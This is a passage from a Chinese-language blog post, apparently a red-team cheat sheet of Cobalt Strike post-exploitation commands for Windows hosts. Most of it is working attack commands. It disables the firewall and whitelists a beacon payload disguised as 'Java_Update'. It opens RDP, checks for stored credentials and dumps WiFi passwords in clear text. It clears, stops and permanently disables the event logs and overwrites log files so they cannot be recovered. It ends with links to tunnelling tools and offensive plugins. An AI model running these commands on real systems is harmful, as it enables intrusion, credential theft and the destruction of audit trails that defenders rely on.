&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">netsh firewall show config
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;h3 id="关闭防墙">关闭防⽕墙&lt;/h3>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-go" data-lang="go">&lt;span class="line">&lt;span class="cl">&lt;span class="nx">netsh&lt;/span> &lt;span class="nx">firewall&lt;/span> &lt;span class="nx">set&lt;/span> &lt;span class="nx">opmode&lt;/span> &lt;span class="nx">disable&lt;/span> &lt;span class="c1">//Windows Server 2003 系统及之前的版本&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nx">netsh&lt;/span> &lt;span class="nx">advfirewall&lt;/span> &lt;span class="nx">set&lt;/span> &lt;span class="nx">allprofiles&lt;/span> &lt;span class="nx">state&lt;/span> &lt;span class="nx">off&lt;/span> &lt;span class="c1">//Windows Server 2003 系统及之后的版本&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>⼀般来说不要操作防⽕墙的开关，⻛险极⼤，只需要查看配置即可&lt;br>
利⽤允许的⼊站端⼝:&lt;br>
查看已放⾏端⼝:&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">shell netsh firewall show portopening
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250717214640.png" alt="image.png">&lt;br>
根据防⽕墙配置，⽬标主机已放⾏ TCP 7001 端⼝的⼊站流量（对应 WebLogic 服务端⼝）。我们可以利⽤这个开放端⼝进⾏ Beacon 连接 这仅表示：&lt;br>
添加防⽕墙规则:&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;span class="lnt">4
&lt;/span>&lt;span class="lnt">5
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-gdscript3" data-lang="gdscript3">&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># 放⾏7001端⼝的⼊站流量（伪装为WebLogic）&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">netsh&lt;/span> &lt;span class="n">advfirewall&lt;/span> &lt;span class="n">firewall&lt;/span> &lt;span class="n">add&lt;/span> &lt;span class="n">rule&lt;/span> &lt;span class="n">name&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s2">&amp;#34;WebLogic_Service&amp;#34;&lt;/span> &lt;span class="n">dir&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="ow">in&lt;/span> &lt;span class="n">protocol&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="n">TCP&lt;/span> &lt;span class="n">localport&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="mi">7001&lt;/span> &lt;span class="n">action&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="n">allow&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># 放⾏CS⽊⻢进程路径（可选）&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">netsh&lt;/span> &lt;span class="n">advfirewall&lt;/span> &lt;span class="n">firewall&lt;/span> &lt;span class="n">add&lt;/span> &lt;span class="n">rule&lt;/span> &lt;span class="n">name&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s2">&amp;#34;Java_Update&amp;#34;&lt;/span> &lt;span class="n">dir&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="ow">in&lt;/span> &lt;span class="n">program&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s2">&amp;#34;C:\Windows\Temp\payload.exe&amp;#34;&lt;/span> &lt;span class="n">action&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="n">allow&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>利⽤ ICMP 协议&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">https://github.com/krabelize/icmpdoor
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>DNS隧道&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">https://github.com/iagox86/dnscat2
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;h1 id="0x12-rdp操作相关">0x12 RDP操作相关&lt;/h1>
&lt;h2 id="查看rdp端">查看RDP端⼝&lt;/h2>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">shell reg query &amp;#34;HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp&amp;#34; /v PortNumber
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250722133525.png" alt="image.png">&lt;br>
为16进制数0xd3d，转换为10进制就是3389&lt;/p>
&lt;h2 id="开放rdp服务">开放RDP服务&lt;/h2>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">shell reg add &amp;#34;HKLM\SYSTEM\CurrentControlSet\control\Terminal Server&amp;#34; /v fDenyTSConnections /d 0 /t REG_DWORD /f
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250722133644.png" alt="image.png">&lt;/p>
&lt;h2 id="开放rdp端">开放RDP端⼝&lt;/h2>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">shell netsh advfirewall firewall add rule name=&amp;#34;Remote Desktop&amp;#34; protocol=TCP dir=in localport=3389 action=allow
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250722133732.png" alt="image.png">&lt;/p>
&lt;h2 id="离线破解rdp连接密码">离线破解RDP连接密码&lt;/h2>
&lt;p>查看是否存在凭证：&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">shell dir /a %userprofile%\AppData\Local\Microsoft\Credentials\*
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250722133858.png" alt="image.png">&lt;/p>
&lt;h2 id="获取wifi密码">获取WiFi密码&lt;/h2>
&lt;p>查看连接过的Wifi名称：&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">netsh wlan show profiles
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250722134654.png" alt="image.png">&lt;br>
如果乱码可以下载下来看&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">shell netsh wlan show profiles &amp;gt; wlan.txt
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>查看指定Wifi的密码：&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">netsh wlan show profile name=&amp;#34;WIFI名称&amp;#34; key=clear
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250722134819.png" alt="image.png">&lt;/p>
&lt;h2 id="查看代理">查看代理&lt;/h2>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">shell reg query &amp;#34;HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Internet Settings&amp;#34;
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250722135014.png" alt="image.png">&lt;/p>
&lt;h1 id="0x13-志痕迹相关">0x13 ⽇志痕迹相关&lt;/h1>
&lt;h2 id="清除事件志">清除事件⽇志&lt;/h2>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;span class="lnt">4
&lt;/span>&lt;span class="lnt">5
&lt;/span>&lt;span class="lnt">6
&lt;/span>&lt;span class="lnt">7
&lt;/span>&lt;span class="lnt">8
&lt;/span>&lt;span class="lnt">9
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">wevtutil cl &amp;#34;Windows PowerShell&amp;#34;
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">wevtutil cl &amp;#34;Security&amp;#34;
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">wevtutil cl &amp;#34;System&amp;#34;
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">wevtutil cl &amp;#34;Application&amp;#34;
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Security：登录/特权操作记录
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Windows PowerShell：PS执⾏历史
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">System：系统服务/驱动事件
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Application：应⽤程序事件
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;h2 id="停志相关服务">停⽌⽇志相关服务&lt;/h2>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;span class="lnt">4
&lt;/span>&lt;span class="lnt">5
&lt;/span>&lt;span class="lnt">6
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">阻⽌新⽇志⽣成
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">禁⽤事件转发功能
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">中断⽇志记录链
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">sc stop Schedule
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">sc stop wecsvc
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">sc stop eventlog
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250722135228.png" alt="image.png">&lt;/p>
&lt;h2 id="永久禁志服务">永久禁⽤⽇志服务&lt;/h2>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">sc config EventLog start= disabled
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;h2 id="志件覆盖">⽇志⽂件覆盖&lt;/h2>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;span class="lnt">4
&lt;/span>&lt;span class="lnt">5
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl"># 物理覆盖⽇志⽂件
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">cipher /w:C:\Windows\System32\winevt\Logs\Security.evtx
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">使⽤cipher⼯具进⾏3次覆盖写⼊
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">防⽌⽂件恢复⼯具提取⽇志
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;h1 id="0x13-cs插件">0x13 CS插件&lt;/h1>
&lt;h4 id="ola">OLa&lt;/h4>
&lt;p>下载地址：&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">https://github.com/d3ckx1/OLa/tree/main
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>cs2插件，直接可以在cs2中使用：&lt;br>
&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250717212946.png" alt="image.png">&lt;/p>
&lt;h4 id="taowu">taowu&lt;/h4>
&lt;p>下载地址：&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">https://github.com/Mr-xn/taowu-cobalt-strike
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>cs2插件&lt;br>
&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250717213252.png" alt="image.png">&lt;/p>
&lt;h4 id="lstar---aggressor">LSTAR - Aggressor&lt;/h4>
&lt;p>下载地址：&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">https://github.com/lintstar/LSTAR/
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>cs插件&lt;br>
&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250717213634.png" alt="image.png">&lt;/p></description></item></channel></rss>